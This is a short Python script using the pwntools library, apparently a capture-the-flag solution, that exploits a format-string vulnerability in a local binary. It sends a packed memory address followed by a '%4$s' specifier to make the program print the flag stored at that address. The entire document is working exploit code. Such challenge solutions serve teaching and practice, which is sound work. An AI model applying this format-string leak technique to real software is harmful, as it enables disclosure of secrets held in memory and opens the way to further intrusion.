from pwn import * 

p = process('./Formatstring-leak-flag-in-mem-bss')

sec = 0x804a060
payload = p32(sec) + b"%4$s"

p.sendline(payload)
p.interactive()
